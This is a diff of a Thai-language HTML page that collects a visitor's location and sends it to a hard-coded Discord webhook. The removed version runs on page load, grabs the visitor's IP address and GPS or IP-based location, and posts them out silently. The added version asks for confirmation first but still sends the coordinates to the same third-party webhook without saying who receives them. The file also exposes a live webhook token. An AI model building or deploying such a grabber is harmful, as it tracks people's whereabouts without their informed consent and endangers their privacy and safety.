@@ -3,103 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP and Location Capture</title>
+    <title>ตำแหน่งจริง (GPS)</title>
     <script>
-        window.onload = async function() {
-            // ฟังก์ชันเพื่อดึงข้อมูลตำแหน่งจาก IP Address ผ่าน IP Geolocation API
-            async function getIpLocation() {
-                try {
-                    const ipResponse = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN'); // เปลี่ยน TOKEN เป็น API Key ของคุณ
-                    const ipData = await ipResponse.json();
-                    return ipData;
-                } catch (error) {
-                    console.error("Error fetching IP location:", error);
-                    return null;
-                }
+        // ฟังก์ชันเริ่มต้น
+        function requestLocationPermission() {
+            // แสดง popup ให้ผู้ใช้ยืนยัน
+            if (confirm("คุณต้องการแชร์ตำแหน่ง GPS ของคุณหรือไม่?")) {
+                // หากผู้ใช้ยืนยัน ให้นำตำแหน่งจาก GPS และส่งไปที่ Discord
+                getLocation();
+            } else {
+                alert("คุณไม่อนุญาตให้แชร์ตำแหน่ง");
             }
+        }
 
-            // ดึง IP ของผู้ใช้จาก ipify API
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            const ip = ipData.ip;
-
-            // ฟังก์ชันที่จะส่งข้อมูลไปยัง Discord Webhook
-            async function sendToWebhook(content) {
-                const webhookUrl = 'https://discord.com/api/webhooks/1302448307775471646/v4lagRRls5NHggJWwlaWPfIpsz3isk0xLeYG7bECQl799ijnAkHECqgIq4GfT2_Lrxgk'; // ใช้ Webhook ของคุณ
-                const payload = {
-                    content: content
-                };
-                try {
-                    const response = await fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(payload),
-                    });
-
-                    if (response.ok) {
-                        console.log("Data sent to Discord successfully!");
-                    } else {
-                        console.error("Error sending data to Discord.");
-                    }
-                } catch (error) {
-                    console.error("Error sending data to Discord:", error);
-                }
-            }
-
-            // ถ้าผู้ใช้อนุญาตให้เข้าถึงตำแหน่งจาก GPS
+        // ฟังก์ชันที่ดึงตำแหน่ง GPS
+        function getLocation() {
             if ("geolocation" in navigator) {
-                console.log("กำลังดึงข้อมูลตำแหน่งจาก GPS...");
-                navigator.geolocation.getCurrentPosition(async function(position) {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-                    console.log("ตำแหน่ง GPS:", latitude, longitude);
+                // ใช้ geolocation API เพื่อดึงตำแหน่ง
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
 
-                    // สร้าง Google Maps Link
-                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                    // สร้างลิงก์ Google Maps ตามตำแหน่งที่ได้รับ
+                    const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                    // ส่งข้อมูลไปยัง Discord
-                    const content = `
-                        IP: ${ip}
-                        ตำแหน่ง (GPS): ${googleMapsLink}
-                    `;
-                    await sendToWebhook(content);
-                    alert("IP และตำแหน่งถูกบันทึกและส่งไปยัง Discord Webhook เรียบร้อยแล้ว!");
-                }, async function(error) {
-                    alert("ไม่สามารถดึงตำแหน่งจาก GPS ได้, จึงใช้ข้อมูลจาก IP เท่านั้น.");
+                    // ส่งข้อมูล GPS ไปที่ Webhook
+                    sendToWebhook(`ตำแหน่ง GPS (ลิงก์ Google Maps): ${googleMapsLink}`);
 
-                    // ใช้ตำแหน่งจาก IP
-                    const ipLocationData = await getIpLocation();
-                    const ipLocation = ipLocationData && ipLocationData.loc ? ipLocationData.loc.split(',') : ['Unknown', 'Unknown'];
-                    console.log("ตำแหน่งจาก IP:", ipLocation);
-
-                    const content = `
-                        IP: ${ip}
-                        ตำแหน่งจาก IP: https://www.google.com/maps?q=${ipLocation[0]},${ipLocation[1]}
-                    `;
-                    await sendToWebhook(content);
-                    alert("ข้อมูลจาก IP ถูกส่งไปยัง Discord Webhook!");
+                    // แจ้งเตือนว่าได้ส่งข้อมูลแล้ว
+                    alert("ตำแหน่ง GPS ได้รับและส่งไปยัง Discord Webhook!");
+                }, function(error) {
+                    console.error("ไม่สามารถดึงข้อมูล GPS:", error);
+                    alert("ไม่สามารถดึงตำแหน่ง GPS ของคุณได้");
                 });
             } else {
-                alert("Geolocation API ไม่รองรับในเบราว์เซอร์นี้.");
-
-                // หากไม่ได้รับตำแหน่ง ให้ใช้ตำแหน่งจาก IP
-                const ipLocationData = await getIpLocation();
-                const ipLocation = ipLocationData && ipLocationData.loc ? ipLocationData.loc.split(',') : ['Unknown', 'Unknown'];
-                console.log("ตำแหน่งจาก IP:", ipLocation);
-
-                const content = `
-                    IP: ${ip}
-                    ตำแหน่งจาก IP: https://www.google.com/maps?q=${ipLocation[0]},${ipLocation[1]}
-                `;
-                await sendToWebhook(content);
-                alert("ข้อมูลจาก IP ถูกส่งไปยัง Discord Webhook!");
+                alert("เบราว์เซอร์ของคุณไม่รองรับการดึงข้อมูลตำแหน่ง");
             }
-        };
+        }
+
+        // ฟังก์ชันส่งข้อมูลไปที่ Discord Webhook
+        function sendToWebhook(content) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1302448307775471646/v4lagRRls5NHggJWwlaWPfIpsz3isk0xLeYG7bECQl799ijnAkHECqgIq4GfT2_Lrxgk'; // แก้ไข Webhook URL ที่นี่
+            const payload = { content: content };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload),
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("ข้อมูลถูกส่งไปยัง Discord!");
+                } else {
+                    console.error("ไม่สามารถส่งข้อมูลไปยัง Discord");
+                }
+            })
+            .catch(error => {
+                console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
+            });
+        }
     </script>
 </head>
 <body>
-    <h1>กำลังบันทึก IP และตำแหน่งของคุณ...</h1>
+    <h1>ตำแหน่ง GPS ของคุณ</h1>
+    <p>กรุณาคลิกที่ปุ่มด้านล่างเพื่อยืนยันว่าอนุญาตให้แชร์ตำแหน่งของคุณ:</p>
+    
+    <!-- ปุ่มยืนยัน -->
+    <button onclick="requestLocationPermission()">ยืนยันการแชร์ตำแหน่ง GPS</button>
 </body>
 </html>
